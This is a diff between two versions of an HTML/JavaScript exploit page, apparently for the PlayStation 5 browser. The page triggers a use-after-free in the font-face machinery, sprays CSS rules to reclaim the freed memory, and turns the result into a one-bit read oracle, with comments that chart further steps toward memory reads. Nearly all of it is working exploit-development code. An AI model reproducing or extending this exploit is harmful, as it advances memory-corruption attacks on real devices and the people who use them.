@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v30 - XObj Oracle</title>
+<title>PS5 v31 - Check Oracle</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v30 XORACLE</span><span class="s">│</span>
+<span class="l">▶ v31 CHKORA</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h3">PRIM:<b>?</b></span>
@@ -45,17 +45,9 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v30 — Cross-Object Write/Read Oracle
-//
-//  CONFIRMED IN v29: Reading "x" returns properties of "A_61"!
-//  This means m_propertiesOrCSSConnection of "x" points to "A_61"'s memory.
-//
-//  PLAN:
-//  1. UAF + CSSRule Spray (A_0 to A_2047)
-//  2. Identify which A_NNN reclaimed the slot via load()
-//  3. Modify A_NNN's properties via CSSRule.style
-//  4. Read "x" via load() to verify it reflects A_NNN's changes
-//  5. If yes = Cross-Object Write/Read Primitive!
+//  PS5 v31 — check() Cross-Object Oracle
+//  JS wrappers are cached. We must use check() which reads
+//  directly from C++ CSSFontSelector.
 // ============================================================
 
 var O=document.getElementById("out");
@@ -74,7 +66,7 @@ window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,60)+" @"+l);return tru
 var keep=[],holes=[];
 var trigger=null,uafOk=false;
 var sh=document.getElementById("s").sheet;
-var aRuleIdx = -1; // Will store the CSSRule index of the reclaimed face
+var aRuleIdx = -1;
 
 var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
 var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
@@ -83,7 +75,7 @@ function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
 
 P("════════════════════════════════════","hd");
-P("  v30 — Cross-Object Oracle","hd");
+P("  v31 — check() Oracle","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -108,9 +100,6 @@ var fsh=fst.sheet;
 for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
 fs();Ok("Trigger ready");
 
-// ============================================================
-//  UAF + CSSOM Spray
-// ============================================================
 pg(20);Hd("UAF trigger + CSSRule Spray");
 
 Object.defineProperty(FontFace.prototype,"then",{configurable:true,
@@ -153,7 +142,7 @@ fs();for(var i=0;i<2048;i++){
 if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
 // ============================================================
-//  PHASE 1: Identify Reclaimed Face
+//  PHASE 1: Identify Reclaimed Face via load()
 // ============================================================
 pg(40);Sep();Hd("PHASE 1: Identify Reclaimed Face");Sep();
 
@@ -200,81 +189,65 @@ document.fonts.load("1em trigger, x","AB").then(function(faces){
 });
 
 // ============================================================
-//  PHASE 2: Cross-Object Write/Read Test
+//  PHASE 2: check() Oracle
 // ============================================================
 function phase2(){
-  pg(60);Sep();Hd("PHASE 2: Write/Read Oracle");Sep();
+  pg(60);Sep();Hd("PHASE 2: check() Oracle");Sep();
 
-  P("  Modifying " + sh.cssRules[aRuleIdx].style.fontFamily + " via CSSRule...","dm");
-  P("  Reading 'x' via load() to see if it reflects changes...","dm");
+  P("  Modifying unicode-range of A_61...","dm");
+  P("  Using check('64px x', 'B') as oracle...","dm");
   P("");
 
-  var weights = ["100", "200", "300", "400", "500", "600", "700", "800", "900"];
   var matchCount = 0;
-  var wi = 0;
-
-  function nextWeight(){
-    if(wi >= weights.length){
-      P("");
-      P("  Oracle Accuracy: " + matchCount + "/9", matchCount >= 5 ? "hl" : "wr");
-      if(matchCount >= 5){
-        St("CROSS-OBJECT ORACLE CONFIRMED!");
-        hu("h3","PRIM:<b>ORACLE</b>");
-      }
-      phase3();
-      return;
-    }
-
-    var w = weights[wi];
-    try {
-      sh.cssRules[aRuleIdx].style.fontWeight = w;
-      fs();
-    } catch(e){
-      Fl("Write error: " + e.message);
-      wi++; nextWeight(); return;
-    }
-
-    document.fonts.load("1em trigger, x","AB").then(function(faces){
-      var xFace = null;
-      for(var i=0; i<faces.length; i++){
-        if(faces[i].family && faces[i].family.indexOf("A_") === 0){
-          xFace = faces[i];
-          break;
-        }
-      }
-
-      var readWeight = xFace ? xFace.weight : "null";
-      var match = (readWeight === w);
-      if(match) matchCount++;
-
-      P("  Write " + w + " → Read " + readWeight + (match ? " ✅" : " ❌"), match ? "ok" : "dm");
-      
-      wi++;
-      nextWeight();
-    }).catch(function(e){
-      P("  Write " + w + " → ERR","er");
-      wi++; nextWeight();
-    });
-  }
   
-  nextWeight();
+  // Test 1: Range U+0042 (B) -> should match
+  try {
+    sh.cssRules[aRuleIdx].style.unicodeRange = "U+0042";
+    fs();
+    var r1 = document.fonts.check("64px x", "B");
+    P("  Range U+0042 -> check(B) = " + r1, r1 ? "ok" : "er");
+    if(r1) matchCount++;
+  } catch(e) { Fl(e.message); }
+
+  // Test 2: Range U+0043 (C) -> should NOT match
+  try {
+    sh.cssRules[aRuleIdx].style.unicodeRange = "U+0043";
+    fs();
+    var r2 = document.fonts.check("64px x", "B");
+    P("  Range U+0043 -> check(B) = " + r2, !r2 ? "ok" : "er");
+    if(!r2) matchCount++;
+  } catch(e) { Fl(e.message); }
+
+  // Test 3: Range U+0041 (A) -> should NOT match
+  try {
+    sh.cssRules[aRuleIdx].style.unicodeRange = "U+0041";
+    fs();
+    var r3 = document.fonts.check("64px x", "B");
+    P("  Range U+0041 -> check(B) = " + r3, !r3 ? "ok" : "er");
+    if(!r3) matchCount++;
+  } catch(e) { Fl(e.message); }
+
+  P("");
+  if(matchCount >= 2) {
+    St("CHECK() ORACLE CONFIRMED!");
+    hu("h3","PRIM:<b>ORACLE</b>");
+  } else {
+    Wr("Oracle failed");
+  }
+
+  phase3();
 }
 
 // ============================================================
-//  PHASE 3: Summary & Next Steps
+//  PHASE 3: Summary
 // ============================================================
 function phase3(){
   pg(100);Sep();Hd("SUMMARY");Sep();
   P("");
-  P("  We have a reliable Cross-Object Oracle!","hl");
-  P("  WRITE: Modify CSSRule of the reclaimed face (A_NNN)","dm");
-  P("  READ:  load('1em trigger, x') returns modified properties","dm");
-  P("");
-  P("  NEXT STEP:","hl");
-  P("  Since we control the CSSRule, we can try to set","dm");
-  P("  unusual values that might trigger memory reads.","dm");
+  P("  We have a 1-bit oracle via unicode-range!","hl");
+  P("  WRITE: Modify CSSRule unicode-range","dm");
+  P("  READ:  check('64px x', 'B') returns true/false","dm");
 }
-
 </script>
 </body>
 </html>
